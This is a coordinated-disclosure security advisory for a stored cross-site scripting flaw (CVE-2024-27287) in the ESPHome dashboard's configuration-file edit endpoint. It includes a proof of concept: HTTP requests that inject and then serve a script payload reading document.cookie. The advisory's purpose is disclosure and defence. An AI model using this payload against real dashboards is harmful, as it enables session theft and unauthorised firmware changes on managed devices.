# Cross-site scripting (stored) in edit configuration file API (CVE-2024-27287) #

## Summary
Edit configuration file API in dashboard component of ESPHome version 2023.12.9 (command line installation and Home Assistant add-on) serves unsanitized data with "Content-Type: text/html; charset=UTF-8", allowing remote authenticated user to inject arbitrary web scripts (XSS).

## Affected products
* ESPHome versions >= 2023.12.9, < 2024.2.2

## Details
It is possible for a malicious authenticated user to inject arbitrary Javascript in configuration files using a POST request to the `/edit` endpoint, the configuration parameter allows to specify the file to write.

To trigger the XSS vulnerability, an authenticated victim must visit the page `/edit?configuration=[xss file]`.

## PoC
To reproduce the issue, it is possible to perform a POST request to inject the payload:

Request:

```
POST /edit?configuration=xss.yaml HTTP/1.1
Host: localhost:6052
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:6052/
Connection: close
Cookie: authenticated=[replace with valid cookie]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 40

<script>alert(document.cookie);</script>
```

Which triggers a positive response:

```
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Thu, 30 Nov 2023 11:02:27 GMT
Content-Length: 0
Connection: close
```

Subsequently it is possible to trigger the XSS with a GET request to the same endpoint:

```
GET /edit?configuration=xss.yaml HTTP/1.1
Host: localhost:6052
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0
Accept: /
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:6052/
Connection: close
Cookie: authenticated=[replace with valid cookie]
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 0
```

Response:
```
HTTP/1.1 200 OK
Server: TornadoServer/6.3.3
Content-Type: text/html; charset=UTF-8
Date: Thu, 30 Nov 2023 11:04:12 GMT
Etag: "ec6c9889f5c9a6c8e9d2d5e4ce1b1a85e6e7da2b"
Content-Length: 40
Connection: close

<script>alert(document.cookie);</script>
```

## Impact
By abusing this vulnerability, a malicious actor could perform operations on the dashboard on the behalf of a logged user, access sensitive information, create, edit and delete configuration files and flash firmware on managed boards.
In addition to this, cookies are not correctly secured, allowing the exfiltration of session cookie values.

## Additional information

### Credit
Spike Reply Cybersecurity Team

### Acknowledgments
Thanks to ESPHome developers for their support with the disclosure of this issue.

### References
- https://nvd.nist.gov/vuln/detail/CVE-2024-27287
- https://github.com/esphome/esphome/security/advisories/GHSA-9p43-hj5j-96h5

### Disclosure timeline

- February 20, 2024: Initial vendor contact
- February 28, 2024: Patch proposed by ESPHome
- February 28, 2024: Spike Reply Cybersecurity Team confirms that security fixes included in patched version are effective
- March 5, 2024: Disclosure
